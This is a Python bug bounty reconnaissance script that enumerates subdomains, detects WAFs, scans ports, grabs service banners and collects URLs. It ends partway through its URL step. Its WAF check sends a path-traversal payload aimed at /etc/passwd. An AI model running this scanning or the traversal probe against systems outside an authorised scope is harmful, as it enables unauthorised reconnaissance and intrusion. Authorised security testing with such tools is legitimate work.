#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────────────────────
#  BB-RECON  v6.0
#  Bug Bounty Reconnaissance Framework
#  Usage: python3 bb_recon.py -d target.com [options]
#
#  Steps:
#   1. Subdomain Enum + Live Resolution   (subfinder|dnsx|httpx pipeline)
#   2. WAF Detection + Baseline           (قبل أي فحص)
#   3. Strategic Port Scan                (naabu top-1000 + interaction)
#   4. URL Collection + Dedup             (waybackurls|gau|katana → uro)
#   5. Smart URL Classifier + Probe       (content-type validated, baseline diff)
#   5b. Active Param Testing              (SQLi · LFI · SSTI · CRLF · Open Redirect)
#   5c. CORS · Host Header · Takeover
#   6. Cookie / Session Analysis          (MD5, weak tokens, fixation)
#   7. Version + CVE Mapping              (tech versions → known CVEs)
#   8. JS Secrets Scanner
#   9. Security Headers Audit
#  10. Nuclei (tech-targeted)
# ─────────────────────────────────────────────────────────────────────────────

import subprocess, sys, os, json, re, argparse, time, shutil, socket, hashlib, signal, shlex, random
import urllib.request, urllib.error, urllib.parse, ssl
import base64, logging, threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from dataclasses import dataclass, field

logger = logging.getLogger("bb-recon")

# ══════════════════════════════════════════════════════════════════════════════
#  TERMINAL UI
# ══════════════════════════════════════════════════════════════════════════════

RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
RED   = "\033[38;5;196m"; GRN  = "\033[38;5;82m";  YLW = "\033[38;5;220m"
BLU   = "\033[38;5;39m";  MGN  = "\033[38;5;201m"; CYN = "\033[38;5;45m"
WHT   = "\033[38;5;255m"; GRY  = "\033[38;5;244m"; BLK = "\033[30m"
ORG   = "\033[38;5;208m"; DGRN = "\033[38;5;48m"
BG_RED = "\033[48;5;196m"; BG_BLK = "\033[48;5;236m"

STEP_TOTAL = 10

@dataclass
class ScanConfig:
    max_threads: int = 30
    verify_ssl: bool = False
    dry_run: bool = False

CONFIG = ScanConfig()

# ── Adaptive Rate Limiter ────────────────────────────────────────────────────
class AdaptiveRateLimiter:
    """Thread-safe rate limiter that adapts to WAF/rate-limit responses."""
    def __init__(self, initial=0.1, max_delay=5.0):
        self.delay = initial
        self.max_delay = max_delay
        self._lock = threading.Lock()
        self.blocked_count = 0
        self.success_streak = 0

    def wait(self):
        if self.delay > 0.01:
            time.sleep(self.delay)

    def report_blocked(self):
        with self._lock:
            self.blocked_count += 1
            self.success_streak = 0
            old = self.delay
            self.delay = min(self.max_delay, self.delay * 1.8)
            if self.delay != old:
                warn(f"Rate-limited — delay {old:.2f}s → {self.delay:.2f}s")

    def report_success(self):
        with self._lock:
            self.success_streak += 1
            if self.success_streak > 10:
                self.delay = max(0.05, self.delay * 0.85)
                self.success_streak = 0

RATE_LIMITER = AdaptiveRateLimiter()

# ── Graceful shutdown flag ───────────────────────────────────────────────────
_interrupted = False

# ── Checkpoint helpers ───────────────────────────────────────────────────────
def save_checkpoint(out, step, data):
    cp = {"step": step, "timestamp": time.time()}
    cp.update(data)
    save_json(f"{out}/.checkpoint.json", cp)

def load_checkpoint(out_dir):
    cp_file = f"{out_dir}/.checkpoint.json"
    if os.path.exists(cp_file):
        try:
            with open(cp_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return None

def banner():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    art = [
        "  ██████╗ ██████╗       ██████╗ ███████╗ ██████╗ ██████╗ ███╗  ██╗",
        "  ██╔══██╗██╔══██╗      ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ██║",
        "  ██████╔╝██████╔╝█████╗██████╔╝█████╗  ██║     ██║   ██║██╔██╗██║",
        "  ██╔══██╗██╔══██╗╚════╝██╔══██╗██╔══╝  ██║     ██║   ██║██║╚████║",
        "  ██████╔╝██████╔╝      ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚███║",
        "  ╚═════╝ ╚═════╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚══╝",
    ]
    print()
    print(GRY + "╔" + "═" * 70 + "╗" + RESET)
    for line in art:
        print(GRY + "║" + RESET + CYN + BOLD + line + " " * (70 - len(line)) + RESET + GRY + "║" + RESET)
    for text in ("v6.0  ·  Bug Bounty Reconnaissance Framework", now):
        p = (70 - len(text)) // 2
        print(GRY + "║" + RESET + GRY + DIM + " " * p + text + " " * (70 - p - len(text)) + RESET + GRY + "║" + RESET)
    print(GRY + "╚" + "═" * 70 + "╝" + RESET)
    print()

def section(num, title):
    filled="█"*num+"░"*(STEP_TOTAL-num)
    print()
    print(GRY+"┌─ "+RESET+WHT+BOLD+f"STEP {num}/{STEP_TOTAL}"+RESET+GRY+" ─── "+RESET+CYN+BOLD+title+RESET)
    print(GRY+f"│  [{filled}]"+RESET)
    print(GRY+"│"+RESET)

def _end():   print(GRY+"└"+"─"*70+RESET)
def ok(m):    print(GRY+"│  "+RESET+DGRN+"✔  "+RESET+WHT+m+RESET)
def info(m):  print(GRY+"│  "+RESET+GRY+"·  "+RESET+GRY+m+RESET)
def warn(m):  print(GRY+"│  "+RESET+YLW+"▲  "+RESET+YLW+m+RESET)
def found(m): print(GRY+"│  "+RESET+MGN+"★  "+RESET+WHT+BOLD+m+RESET)
def vuln(m):  print(GRY+"│  "+RESET+RED+"!! "+RESET+RED+BOLD+m+RESET)

def sbadge(code):
    c=int(code) if str(code).isdigit() else 0
    if c==200:          return "\033[48;5;28m"+WHT+f" {c} "+RESET
    if c in(301,302):   return "\033[48;5;39m"+BLK+f" {c} "+RESET
    if c==401:          return "\033[48;5;202m"+WHT+f" {c} "+RESET
    if c==403:          return "\033[48;5;130m"+WHT+f" {c} "+RESET
    if c==500:          return BG_RED+WHT+f" {c} "+RESET
    if c>0:             return BG_BLK+GRY+f" {c} "+RESET
    return BG_BLK+GRY+" ERR "+RESET

def sevbadge(s):
    s=s.upper()
    if s=="CRITICAL": return BG_RED+WHT+BOLD+" CRIT "+RESET
    if s=="HIGH":     return "\033[48;5;196m"+WHT+BOLD+" HIGH "+RESET
    if s=="MEDIUM":   return "\033[48;5;220m"+BLK+"  MED "+RESET
    return BG_BLK+GRY+f" {s[:4]:4} "+RESET

# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"

KNOWN_TECH_KEYS = {
    "wordpress","drupal","joomla","laravel","django","flask","rails","spring",
    "nginx","apache","iis","tomcat","node.js","next.js","nuxt","php","asp.net",
    "jquery","react","angular","vue","svelte","bootstrap","tailwind","grafana",
    "jenkins","kibana","elasticsearch","redis","mongodb","mysql","postgres",
    "couchdb","kubernetes","docker","aws","azure","cloudflare","firebase",
    "jira","confluence","gitlab","github","magento","shopify","woocommerce",
    "strapi","ghost","varnish","prettyPhoto","slider revolution",
    "pdf.js","modernizr","moment.js","owl carousel","isotope","masonry",
}

def is_likely_tech(label):
    l = (label or "").strip().lower()
    if not l:
        return False
    if l in KNOWN_TECH_KEYS:
        return True
    if re.search(r"\b(v?\d+(?:\.\d+){1,3})\b", l):
        return True
    return any(k in l or l in k for k in KNOWN_TECH_KEYS)

# SSL context
def _ctx():
    if CONFIG.verify_ssl:
        return ssl.create_default_context()
    ctx=ssl.create_default_context()
    ctx.check_hostname=False
    ctx.verify_mode=ssl.CERT_NONE
    return ctx

# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def t_ok(name): return bool(shutil.which(name))

def pool_workers(default_workers):
    try:
        return max(1, min(int(default_workers), int(CONFIG.max_threads)))
    except Exception:
        return max(1, int(default_workers))

def in_target_domain(url_or_host, domain):
    host = url_or_host.strip().lower()
    if not host:
        return False
    if "://" in host:
        try:
            host = urllib.parse.urlparse(host).netloc.lower()
        except Exception:
            return False
    host = host.split(":")[0].strip(".")
    domain = domain.lower().strip(".")
    return host == domain or host.endswith("." + domain)

def shell_cat_cmd(path):
    quoted = f'"{path}"'
    return f"type {quoted}" if os.name == "nt" else f"cat {quoted}"

def _normalize_cmd(cmd):
    if isinstance(cmd, (list, tuple)):
        return [str(x) for x in cmd]
    if isinstance(cmd, str):
        return shlex.split(cmd, posix=(os.name != "nt"))
    raise TypeError("cmd must be str/list/tuple")

def run_cmd(cmd, timeout=120, input_data=None):
    if CONFIG.dry_run:
        info(f"[dry-run] {' '.join(_normalize_cmd(cmd))}")
        return ""
    try:
        r=subprocess.run(_normalize_cmd(cmd),capture_output=True,text=True,
                         input=input_data,
                         timeout=timeout,env=os.environ.copy())
        return r.stdout.strip()
    except subprocess.TimeoutExpired:
        warn(f"Timeout ({timeout}s)")
        return ""
    except Exception as e:
        warn(f"cmd error: {e}")
        return ""

def pipe_cmd(cmd, timeout=300, retries=2, input_data=None):
    if CONFIG.dry_run:
        info(f"[dry-run] {' '.join(_normalize_cmd(cmd))}")
        return []
    for attempt in range(1, retries+1):
        try:
            proc=subprocess.Popen(_normalize_cmd(cmd),stdout=subprocess.PIPE,
                                  stdin=subprocess.PIPE if input_data is not None else None,
                                  stderr=subprocess.DEVNULL,text=True,
                                  env=os.environ.copy())
            try:
                stdout,_=proc.communicate(input=input_data, timeout=timeout)
                lines=[l.strip() for l in stdout.splitlines() if l.strip()]
                if lines: return lines
                if attempt<retries:
                    warn(f"Pipeline empty — retry {attempt}/{retries} ...")
                    time.sleep(2); continue
                return []
            except subprocess.TimeoutExpired:
                proc.kill()
                warn(f"Pipeline timeout ({timeout}s) — partial results")
                stdout,_=proc.communicate()
                return [l.strip() for l in stdout.splitlines() if l.strip()]
        except Exception as e:
            warn(f"Pipeline error (attempt {attempt}): {e}")
            if attempt<retries: time.sleep(2)
    return []

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self,*a,**kw): return None

def http_probe(url, timeout=8, method="GET", data=None, extra_headers=None,
               follow_redirects=True):
    """SSL-ignoring HTTP probe with retry. Returns (code, body, headers_dict, ms)."""
    https_h = urllib.request.HTTPSHandler(context=_ctx())
    redir_h  = urllib.request.HTTPRedirectHandler if follow_redirects else _NoRedirect
    opener   = urllib.request.build_opener(https_h, redir_h)
    for attempt in range(2):
        req=urllib.request.Request(url, method=method, headers={
            "User-Agent": UA, "Accept": "text/html,application/json,*/*",
            "Connection": "close",
        })
        if extra_headers:
            for k,v in extra_headers.items(): req.add_header(k,v)
        if data:
            req.data = data if isinstance(data,bytes) else data.encode()
        t0=time.time()
        try:
            with opener.open(req, timeout=timeout) as r:
                body=r.read(524288).decode("utf-8",errors="ignore")
                return r.status, body, dict(r.headers), int((time.time()-t0)*1000)
        except urllib.error.HTTPError as e:
            try:    body=e.read(8192).decode("utf-8",errors="ignore")
            except Exception: body=""
            hdrs=dict(e.headers) if hasattr(e,"headers") else {}
            return e.code, body, hdrs, int((time.time()-t0)*1000)
        except (ConnectionResetError, TimeoutError, ssl.SSLError,
                ConnectionRefusedError, urllib.error.URLError):
            if attempt==0:
                time.sleep(0.5 + random.uniform(0.0, 0.5))
                continue
            return 0,"",{},0
        except Exception:
            return 0,"",{},0
    return 0,"",{},0

def save_json(p,d):
    with open(p,"w",encoding="utf-8") as f:
        f.write(json.dumps(d,indent=2,ensure_ascii=False))

def save_txt(p,d):
    with open(p,"w",encoding="utf-8") as f:
        f.write("\n".join(str(x) for x in d))

# ══════════════════════════════════════════════════════════════════════════════
#  1. SUBDOMAIN ENUM + LIVE RESOLUTION
# ══════════════════════════════════════════════════════════════════════════════

def enum_and_resolve(domain, out):
    section(1,"SUBDOMAIN ENUM  +  LIVE RESOLUTION")

    subs=set()
    # crt.sh
    info("crt.sh ...")
    try:
        req=urllib.request.Request(f"https://crt.sh/?q=%.{domain}&output=json",
                                   headers={"User-Agent":UA})
        with urllib.request.urlopen(req,timeout=15) as r:
            for e in json.loads(r.read()):
                for n in e.get("name_value","").splitlines():
                    n=n.strip().lstrip("*.")
                    if n.endswith(domain) and " " not in n: subs.add(n)
        ok(f"crt.sh  → {len(subs)} entries")
    except Exception as ex:
        warn(f"crt.sh: {ex}")

    have_sf=t_ok("subfinder"); have_dnsx=t_ok("dnsx"); have_httpx=t_ok("httpx")

    sf_subs=[]
    if have_sf:
        info("subfinder ...")
        r=run_cmd(["subfinder", "-d", domain, "-silent", "-all"], 90)
        sf_subs=[s.strip().lower() for s in r.splitlines() if s.strip().lower().endswith(domain)]
    else:
        warn("subfinder missing")

    live_lines=[]; tech_map={}; all_subs=set(subs)
    NOISE={
        "hsts","not found","home","index","error","ok","forbidden","redirect",
        "moved","bad request","unauthorized","server error","page not found",
        "access denied","welcome","login","sign in","dashboard","portal",
        "loading","please wait","vendor portal","green riyadh",
    }

    all_subs.update(sf_subs)

    if have_dnsx and all_subs:
        info("dnsx resolve ...")
        print(GRY+"│"+RESET)
        dns_in="\n".join(sorted(all_subs))+"\n"
        dns_lines=pipe_cmd(["dnsx", "-silent"], timeout=180, input_data=dns_in)
        resolved=[h.strip().lower() for h in dns_lines if h.strip()]
        if resolved:
            all_subs=set(resolved)
    elif not have_dnsx:
        warn("dnsx missing")

    if have_httpx and all_subs:
        info("httpx probe ...")
        print(GRY+"│"+RESET)
        hx_in="\n".join(sorted(all_subs))+"\n"
        lines=pipe_cmd(["httpx", "-silent", "-status-code", "-title", "-tech-detect",
                        "-no-color", "-timeout", "8", "-retries", "1", "-threads", "50",
                        "-follow-redirects"], timeout=300, input_data=hx_in)
        for line in lines:
            line=line.strip()
            if not line:
                continue
            if line.startswith("http"):
                live_lines.append(line)
                hm=re.match(r"(https?://[^\s\[]+)",line)
                techs=re.findall(r"\[([A-Za-z][A-Za-z0-9\-. ]{1,28})\]",line)
                if hm and techs:
                    host=re.sub(r"https?://","",hm.group(1)).rstrip("/")
                    real=[t for t in techs
                          if t.lower() not in NOISE
                          and not re.match(r"^\d+$",t)
                          and len(t)>=3 and t.count(" ")<=2
                          and is_likely_tech(t)]
                    if real:
                        tech_map[host]=real
                sc=re.search(r"\[(\d{3})\]",line)
                code=int(sc.group(1)) if sc else 0
                print(GRY+"│  "+RESET+sbadge(code)+"  "+WHT+line[:90]+RESET)
    else:
        if not have_httpx:
            warn("httpx missing")
        warn("Insufficient tools — basic fallback probing")
        for sub in sorted(all_subs)[:100]:
            code,body,hdrs,ms=http_probe(f"https://{sub}",timeout=6)
            if code:
                entry=f"https://{sub} [{code}] [{hdrs.get('Server','')}]"
                live_lines.append(entry)
                print(GRY+"│  "+RESET+sbadge(code)+"  "+WHT+entry[:80]+RESET)

    all_subs_sorted=sorted(all_subs)
    save_txt(f"{out}/subdomains.txt",all_subs_sorted)
    save_txt(f"{out}/live_hosts.txt",live_lines)
    save_json(f"{out}/tech_map.json",tech_map)
    ok(f"Subdomains   : {BOLD}{len(all_subs_sorted)}{RESET}")
    ok(f"Live hosts   : {BOLD}{len(live_lines)}{RESET}")
    ok(f"Tech detected: {BOLD}{len(tech_map)}{RESET}")
    _end()
    return all_subs_sorted,live_lines,tech_map

# ══════════════════════════════════════════════════════════════════════════════
#  2. WAF DETECTION + BASELINE
#     يكتشف WAF ويحدد baseline size للمقارنة — قبل أي فحص
# ══════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES = {
    "Cloudflare":    ["cloudflare","cf-ray","__cfduid"],
    "AWS WAF":       ["x-amzn-requestid","awswaf","x-amz-cf-id"],
    "Akamai":        ["akamai","x-check-cacheable","x-akamai"],
    "F5 BIG-IP":     ["x-cnection","bigip","f5","ts=","x-wa-info"],
    "Sucuri":        ["x-sucuri","sucuri","x-sucuri-id"],
    "ModSecurity":   ["mod_security","modsecurity","owasp"],
    "Imperva/Incapsula":["x-iinfo","incapsula","visid_incap","incap_ses"],
    "Fortinet":      ["fortigate","fortiwebeid","fortiweb"],
    "Barracuda":     ["barra_counter_session","barracudabypass"],
    "Sophos":        ["x-astaro-id"],
    "Wordfence":     ["wordfence"],
    "DenyAll":       ["sessioncookie","detected"],
    "Comodo":        ["x-c3-id","comodo"],
    "Palo Alto":     ["x-pan-","panorama"],
    "Generic WAF":   ["attack id","attack_id","web page blocked","blocked by"],
}

def detect_waf_and_baseline(domain, live_lines, out):
    section(2,"WAF DETECTION  +  BASELINE FINGERPRINT")

    import random, string as _str

    # ── جمع كل الـ hosts من live_lines ────────────────────────────────────────
    hosts_to_baseline = set()
    for line in live_lines:
        m = re.match(r"https?://([^/\s\[]+)", line)
        if m:
            hosts_to_baseline.add(m.group(1))
    hosts_to_baseline.add(domain)   # الـ root دائماً

    # baselines مفهرسة بالـ host
    baselines = {}    # host → baseline_dict

    def _build_host_baseline(host):
        base_url = f"https://{host}"
        bl = {"host": host}

        # Baseline عادي
        code_n, body_n, hdrs_n, ms_n = http_probe(base_url+"/", timeout=10)
        bl["normal_code"] = code_n
        bl["normal_size"] = len(body_n)
        bl["normal_ms"]   = ms_n

        # 3 مسارات وهمية → median
        fake_bodies, fake_sizes = [], []
        fc = 0
        for i in range(3):
            rand_suffix = "".join(random.choices(_str.ascii_lowercase + _str.digits, k=10))
            fc, fb, _, _ = http_probe(f"{base_url}/nonexistent_{rand_suffix}", timeout=8)
            fake_bodies.append(fb)
            fake_sizes.append(len(fb))

        fake_sizes.sort()
        med = fake_sizes[1]
        thr = max(150, int(med * 0.10))
        fake_hashes = {hashlib.md5(b.encode()).hexdigest() for b in fake_bodies if b}
        fake_snippets = set()
        for fb in fake_bodies:
            clean = re.sub(r"<[^>]+>", "", fb).strip()[:100]
            if len(clean) > 20:
                fake_snippets.add(clean.lower())

        code_404 = fc
        bl["fake_404_code"]     = code_404
        bl["fake_404_size"]     = med
        bl["soft_404"]          = (code_404 == 200)
        bl["soft_404_size"]     = med if code_404 == 200 else 0
        bl["soft_404_threshold"]= thr if code_404 == 200 else 0
        bl["soft_404_hashes"]   = list(fake_hashes)
        bl["soft_404_snippets"] = list(fake_snippets)
        return bl

    # بناء baseline للـ root domain أولاً (يُستخدم للـ WAF probe)
    info(f"Building per-host baselines for {len(hosts_to_baseline)} host(s) ...")
    with ThreadPoolExecutor(max_workers=pool_workers(10)) as _ex:
        _fmap = {_ex.submit(_build_host_baseline, h): h for h in hosts_to_baseline}
        for _f in as_completed(_fmap):
            _h = _fmap[_f]
            try:
                _bl = _f.result(timeout=30)
                baselines[_h] = _bl
                _s = "SOFT404" if _bl["soft_404"] else "normal"
                ok(f"{_h:<40}  {sbadge(_bl['normal_code'])}  "
                   f"fake={_bl['fake_404_size']}b  [{_s}]")
            except Exception as _e:
                warn(f"Baseline failed for {_h}: {_e}")

    # baseline الرئيسي هو النطاق الرئيسي
    base_url = f"https://{domain}"
    baseline = baselines.get(domain, _build_host_baseline(domain))
    waf_detected = None
    waf_delay = 0.0

    code_n  = baseline["normal_code"]
    body_n  = ""
    hdrs_n  = {}
    _, body_n, hdrs_n, _ = http_probe(base_url+"/", timeout=8)

    # baselines built per-host above

    # ── 3. WAF probe — طلب مشبوه لإثارة WAF ─────────────────────────────────
    info("WAF probe ...")
    code_w,body_w,hdrs_w,ms_w=http_probe(
        base_url+"/index.php?param=../../../../etc/passwd",timeout=8)

    # فحص headers + body
    all_headers_lower={k.lower():v.lower() for k,v in hdrs_w.items()}
    body_check=(body_w[:2000]).lower()

    for waf_name,sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            sig_l=sig.lower()
            if (sig_l in body_check or
                any(sig_l in k or sig_l in v for k,v in all_headers_lower.items())):
                waf_detected=waf_name
                break
        if waf_detected: break

    # فحص status code مشبوه
    if not waf_detected:
        if code_w in (406,429,503) and code_n==200:
            waf_detected="Generic WAF (status-based)"
        elif code_w==200 and len(body_w)<500 and code_n==200 and len(body_n)>500:
            waf_detected="Generic WAF (response-size anomaly)"

    if waf_detected:
        found(f"WAF Detected: {waf_detected}")
        warn("WAF active — bypass techniques will be applied automatically")
        waf_delay = 0.5
        info(f"WAF delay set to {waf_delay}s per request")
    else:
        ok("No WAF detected — or WAF not triggered by probe")

    # ── 4. Server headers fingerprint ────────────────────────────────────────
    server_info={}
    for h in ("Server","X-Powered-By","X-AspNet-Version","X-Runtime","X-Generator"):
        if h in hdrs_n: server_info[h]=hdrs_n[h]

    if server_info:
        info("Server headers:")
        for k,v in server_info.items():
            print(GRY+"│    "+RESET+CYN+f"{k}: "+RESET+WHT+v+RESET)

    baseline["waf"]=waf_detected
    baseline["server_headers"]=server_info
    # أضف waf لكل host baseline أيضاً
    for _bl in baselines.values():
        _bl["waf"] = waf_detected
    baselines[domain] = baseline
    save_json(f"{out}/baseline.json", baselines)
    _end()
    return baselines, waf_delay

# ══════════════════════════════════════════════════════════════════════════════
#  3. STRATEGIC PORT SCAN  +  INTERACTION
# ══════════════════════════════════════════════════════════════════════════════

PORT_PROFILES={
    80:("http","web"),443:("https","web"),8080:("http","web"),
    8443:("https","web"),8000:("http","web"),8001:("http","web"),
    8008:("http","web"),8081:("http","web"),8082:("http","web"),
    8083:("http","web"),8085:("http","web"),8086:("http","web"),
    8090:("http","web"),8444:("https","web"),8888:("http","web"),
    9000:("http","web"),9001:("http","web"),9080:("http","web"),
    9090:("http","web"),3000:("http","web"),4000:("http","web"),
    5000:("http","web"),9200:("http","elasticsearch"),
    9300:("tcp","elasticsearch-transport"),
    6379:("tcp","redis"),27017:("tcp","mongodb"),
    5432:("tcp","postgres"),3306:("tcp","mysql"),
    5984:("http","couchdb"),2375:("http","docker"),
    2376:("https","docker-tls"),
    22:("tcp","ssh"),21:("tcp","ftp"),
}



def port_scan(live_lines, out):
    section(3,"STRATEGIC PORT SCAN  +  SERVICE INTERACTION")

    if not t_ok("naabu"):
        warn("naabu not found → go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest")
        _end(); return {}

    hosts=set()
    for line in live_lines:
        m=re.match(r"https?://([^/\s\[]+)",line)
        if m: hosts.add(m.group(1))

    if not hosts:
        warn("No live hosts for port scan"); _end(); return {}

    hosts_file=f"{out}/_hosts_for_ports.txt"
    save_txt(hosts_file,sorted(hosts))
    info(f"Scanning {len(hosts)} hosts · top-1000 ports ...")
    print(GRY+"│"+RESET)

    lines=pipe_cmd(["naabu", "-l", hosts_file, "-top-ports", "1000", "-c", "50", "-silent", "-no-color"], 180)

    port_map=defaultdict(list)
    for line in lines:
        m=re.match(r"([^:]+):(\d+)",line.strip())
        if m:
            host,port=m.group(1),int(m.group(2))
            port_map[host].append(port)
            badge=MGN+"[!]"+RESET if port in PORT_PROFILES else GRY+"[ ]"+RESET
            svc=PORT_PROFILES.get(port,("",""))[1]
            svc_s=GRY+DIM+f"  [{svc}]"+RESET if svc else ""
            print(GRY+"│  "+RESET+badge+"  "+WHT+f"{host}:{port}"+RESET+svc_s)

    # skip port 80 if 443 exists on same host
    hosts_with_443={h for h,ports in port_map.items() if 443 in ports}

    tasks=[(h,p) for h,ports in port_map.items()
           for p in ports
           if p in PORT_PROFILES
           and not (p==80 and h in hosts_with_443)]

    print(GRY+"│"+RESET)
    info(f"Probing {len(tasks)} interesting services ...")
    print(GRY+"│"+RESET)

    port_findings=[]

    def probe_port(host,port):
        scheme,svc=PORT_PROFILES[port]
        result={"host":host,"port":port,"service":svc,"findings":[]}

        if scheme in ("http","https"):
            base=f"{scheme}://{host}:{port}"
            # root
            code,body,hdrs,ms=http_probe(base+"/",timeout=8)
            server=hdrs.get("Server",""); powered=hdrs.get("X-Powered-By","")
            result["findings"].append({"method":"GET /","code":code,
                                       "server":server,"powered_by":powered,"ms":ms})
            if code==405:
                c2,b2,_,ms2=http_probe(base+"/",method="POST",
                                        data=b"{}",timeout=6,
                                        extra_headers={"Content-Type":"application/json"})
                result["findings"].append({"method":"POST /","code":c2,"ms":ms2})



        elif scheme=="tcp":
            probes={"redis":b"PING\r\n","ftp":None,"ssh":None,"mongodb":None}
            pd=probes.get(svc)
            try:
                with socket.create_connection((host,port),timeout=6) as sock:
                    if pd: sock.sendall(pd)
                    banner=sock.recv(512).decode("utf-8",errors="ignore").strip()
                    result["findings"].append({"method":"TCP banner","banner":banner[:200]})
            except Exception as e:
                result["findings"].append({"method":"TCP banner","error":str(e)[:60]})

        return result

    with ThreadPoolExecutor(max_workers=pool_workers(15)) as ex:
        pfmap={ex.submit(probe_port,h,p):(h,p) for h,p in tasks}
        for f in as_completed(pfmap):
            try:
                res=f.result(timeout=30)
                h,p=pfmap[f]; svc=res["service"]
                fds=[fi for fi in res["findings"] if fi.get("code") or "banner" in fi]
                if not fds: continue
                print(GRY+"│  "+RESET+CYN+BOLD+f"{h}:{p}"+RESET+GRY+f"  [{svc}]"+RESET)
                for fi in fds:
                    if "banner" in fi:
                        b=fi["banner"]
                        color=RED+BOLD if any(x in b.lower() for x in
                              ("no auth","unauthorized required: 0","version")) else GRY
                        print(GRY+"│    "+RESET+YLW+"[BANNER] "+RESET+color+b[:100]+RESET)
                        if "no auth" in b.lower():
                            found(f"UNAUTHENTICATED {svc.upper()} → {h}:{p}")
                    else:
                        fc=fi.get("code",0); method=fi.get("method","")
                        snippet=fi.get("snippet","")[:80]
                        validated=fi.get("validated",True)
                        line_str=(GRY+"│    "+RESET+sbadge(fc)+"  "+
                                  GRY+f"{method:<22}"+RESET)
                        if snippet and validated:
                            line_str+=GRY+DIM+"  "+snippet+RESET
                        print(line_str)
                        if fc==200 and validated and method!="GET /":
                            found(f"Exposed: {h}:{p}{method.split()[-1]}")
                port_findings.append(res)
                print(GRY+"│"+RESET)
            except Exception as e:
                logger.debug(f"Port probe failed for {pfmap[f]}: {e}")

    save_json(f"{out}/port_scan.json",{h:sorted(p) for h,p in port_map.items()})
    save_json(f"{out}/port_findings.json",port_findings)
    ok(f"Open ports   : {BOLD}{sum(len(v) for v in port_map.values())}{RESET}")
    ok(f"Services probed: {BOLD}{len(tasks)}{RESET}")
    _end()
    return dict(port_map)

# ══════════════════════════════════════════════════════════════════════════════
#  4. URL COLLECTION + DEDUP
# ══════════════════════════════════════════════════════════════════════════════

def collect_and_dedup(domain, live_lines, out):
    section(4,"URL COLLECTION  +  SMART DEDUP  (uro)")
    raw=set()

    if t_ok("waybackurls"):
        info("waybackurls ...")
        r=run_cmd(["waybackurls"], 90, input_data=domain+"\n")
        new={l.strip() for l in r.splitlines() if domain in l and l.startswith("http")}
        raw|=new; ok(f"waybackurls  → {len(new):>6}")
    else:
        warn("waybackurls missing")

    if t_ok("gau"):
        info("gau ...")
        r=run_cmd(["gau", domain, "--threads", "5", "--timeout", "30"], 90)
        new={l.strip() for l in r.splitlines() if domain in l and l.startswith("http")}
        raw|=new; ok(f"gau          → {len(new):>6}")

    if t_ok("katana"):
        info("katana crawl — all live hosts ...")
        # استخرج unique hosts من live_lines
        live_hosts_urls = set()
        for line in live_lines:
            m = re.match(r"(https?://[^\s\[/]+)", line)
            if m: live_hosts_urls.add(m.group(1))
        live_hosts_urls.add(f"https://{domain}")   # root دائماً
        # اكتب ملف قائمة
        katana_list = f"{out}/_katana_targets.txt"
        save_txt(katana_list, sorted(live_hosts_urls))
        # timeout = max(300, hosts*8) حتى 900s
        _kt = min(900, max(300, len(live_hosts_urls) * 8))
        r=run_cmd(["katana", "-list", katana_list, "-silent", "-depth", "3", "-js-crawl",
                   "-no-color", "-timeout", "10", "-concurrency", "10", "-retry", "1"], _kt)
        new={l.strip() for l in r.splitlines() if l.startswith("http")}
        raw|=new; ok(f"katana       → {len(new):>6}  ({len(live_hosts_urls)} hosts)")

    raw_count=len(raw)
    ok(f"Raw total    : {BOLD}{raw_count}{RESET}")
    print(GRY+"│"+RESET)

    raw_list=sorted(raw)
    raw_file=f"{out}/_raw_urls.txt"
    save_txt(raw_file,raw_list)

    # ── robots.txt + sitemap.xml + security.txt ─────────────────────────────
    info("robots.txt / sitemap.xml / security.txt ...")
    base = f"https://{domain}"
    extra_urls = set()

    code_r, body_r, _, _ = http_probe(base + "/robots.txt", timeout=8)
    if code_r == 200 and "disallow" in body_r.lower():
        for rm in re.finditer(r"(?:Dis)?allow:\s*(/\S+)", body_r, re.I):
            rp = rm.group(1).strip()
            if rp != "/":
                extra_urls.add(base + rp)
        ok(f"robots.txt   → {len(extra_urls)} paths")

    for sm_path in ["/sitemap.xml", "/sitemap_index.xml"]:
        code_s, body_s, _, _ = http_probe(base + sm_path, timeout=8)
        if code_s == 200 and "<loc>" in body_s.lower():
            sm_urls = re.findall(r"<loc>([^<]+)</loc>", body_s)
            extra_urls.update(u.strip() for u in sm_urls if u.strip().startswith("http"))
            ok(f"{sm_path[1:]:<13}→ {len(sm_urls)} URLs")

    for sec_path in ["/.well-known/security.txt", "/security.txt"]:
        code_sec, body_sec, _, _ = http_probe(base + sec_path, timeout=6)
        if code_sec == 200 and ("contact:" in body_sec.lower() or "policy:" in body_sec.lower()):
            found(f"security.txt found → {sec_path}")

    if extra_urls:
        scope_extra = {u for u in extra_urls if in_target_domain(u, domain)}
        raw_list = sorted(set(raw_list) | scope_extra)
        ok(f"Extra from robots/sitemap: {len(scope_extra)} in-scope URLs")

    print(GRY+"│"+RESET)

    if t_ok("uro"):
        info("uro deduplication ...")
        lines=pipe_cmd(["uro"],60,input_data=("\n".join(raw_list)+"\n") if raw_list else "")
        urls=[l for l in lines if l.startswith("http")]
        info(f"{raw_count} → {len(urls)}  (removed {raw_count-len(urls)})")
    else:
        warn("uro missing → pip install uro")
        STATIC=re.compile(
            r"\.(png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|otf|css|map"
            r"|mp4|mp3|webm|pdf)(\?.*)?$",re.I)
        seen=set(); urls=[]
        for u in raw:
            if STATIC.search(u): continue
            try:
                key=urllib.parse.urlparse(u).netloc+urllib.parse.urlparse(u).path
                if key in seen: continue
                seen.add(key); urls.append(u)
            except Exception: urls.append(u)

